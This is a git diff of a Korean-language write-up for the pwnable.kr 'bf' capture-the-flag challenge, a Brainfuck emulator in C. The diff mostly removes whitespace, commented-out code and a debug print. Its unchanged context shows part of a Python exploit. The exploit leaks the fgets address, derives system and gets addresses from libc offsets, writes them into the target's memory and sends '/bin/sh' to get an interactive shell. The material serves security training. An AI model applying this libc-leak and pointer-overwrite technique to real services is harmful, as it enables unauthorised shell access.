@@ -2,8 +2,8 @@
 
 ## 문제
 
-> I made a simple brain-fuck language emulation program written in C.   
-> The \[ \] commands are not implemented yet. However the rest functionality seems working fine.   
+> I made a simple brain-fuck language emulation program written in C.  
+> The \[ \] commands are not implemented yet. However the rest functionality seems working fine.  
 > Find a bug and exploit it to get a shell.
 >
 > Download : [http://pwnable.kr/bin/bf](http://pwnable.kr/bin/bf)  
@@ -39,9 +39,6 @@
 import nclib
 import time
 import binascii
-# from pwn import ELF
-
-# libc = ELF("./bf_libc.so")
 
 nc = nclib.Netcat(("pwnable.kr", 9001))
 time.sleep(2)
@@ -84,7 +81,6 @@ time.sleep(1)
 
 # fgets_addr = int(binascii.hexlify(nc.recv()), 16)
 addr = nc.recv(4)
-print(addr)    
 fgets_addr = int.from_bytes(addr, byteorder='little')
 system_addr = fgets_addr - so_fgets + so_system
 gets_addr = fgets_addr - so_fgets + so_gets
@@ -95,8 +91,6 @@ print('main_addr :', hex(main))
 nc.send(system_addr.to_bytes(4, byteorder='little'))
 nc.send(gets_addr.to_bytes(4, byteorder='little'))
 nc.send(main.to_bytes(4, byteorder='little'))
-# addrs = system_addr.to_bytes(4, byteorder='little')+ gets_addr.to_bytes(4, byteorder='little')+ main.to_bytes(4, byteorder='little')
-# nc.send(addrs + b'/bin/sh\n')
 nc.send(b'/bin/sh\n')
 
 nc.interact()
